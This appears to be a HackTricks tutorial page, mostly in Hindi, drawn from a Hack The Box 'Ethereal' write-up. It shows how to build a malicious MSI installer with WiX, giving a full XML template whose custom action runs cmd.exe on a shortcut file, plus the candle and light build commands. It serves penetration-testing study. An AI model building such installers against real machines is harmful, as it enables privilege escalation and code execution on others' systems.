{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

# दुर्भावनापूर्ण MSI बनाना और रूट प्राप्त करना

MSI इंस्टॉलर का निर्माण wixtools का उपयोग करके किया जाएगा, विशेष रूप से [wixtools](http://wixtoolset.org) का उपयोग किया जाएगा। यह उल्लेख करना महत्वपूर्ण है कि वैकल्पिक MSI बिल्डरों का प्रयास किया गया, लेकिन वे इस विशेष मामले में सफल नहीं हुए।

wix MSI उपयोग के उदाहरणों की व्यापक समझ के लिए, [इस पृष्ठ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) पर परामर्श करना उचित है। यहाँ, आप विभिन्न उदाहरण पा सकते हैं जो wix MSI के उपयोग को प्रदर्शित करते हैं।

उद्देश्य एक ऐसा MSI उत्पन्न करना है जो lnk फ़ाइल को निष्पादित करेगा। इसे प्राप्त करने के लिए, निम्नलिखित XML कोड का उपयोग किया जा सकता है ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
यह ध्यान रखना महत्वपूर्ण है कि Package तत्व में InstallerVersion और Compressed जैसे गुण होते हैं, जो इंस्टॉलर के संस्करण को निर्दिष्ट करते हैं और यह संकेत करते हैं कि पैकेज संकुचित है या नहीं।

निर्माण प्रक्रिया में msi.xml से wixobject उत्पन्न करने के लिए wixtools से candle.exe उपकरण का उपयोग करना शामिल है। निम्नलिखित आदेश निष्पादित किया जाना चाहिए:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
इसके अतिरिक्त, यह उल्लेख करना महत्वपूर्ण है कि पोस्ट में एक चित्र प्रदान किया गया है, जो कमांड और इसके आउटपुट को दर्शाता है। आप दृश्य मार्गदर्शन के लिए इसका संदर्भ ले सकते हैं।

इसके अलावा, light.exe, जो कि wixtools का एक और उपकरण है, wixobject से MSI फ़ाइल बनाने के लिए उपयोग किया जाएगा। निष्पादित करने के लिए कमांड इस प्रकार है:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Similar to the previous command, an image is included in the post illustrating the command and its output.

कृपया ध्यान दें कि जबकि यह सारांश मूल्यवान जानकारी प्रदान करने का लक्ष्य रखता है, अधिक व्यापक विवरण और सटीक निर्देशों के लिए मूल पोस्ट को संदर्भित करना अनुशंसित है।

## References
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
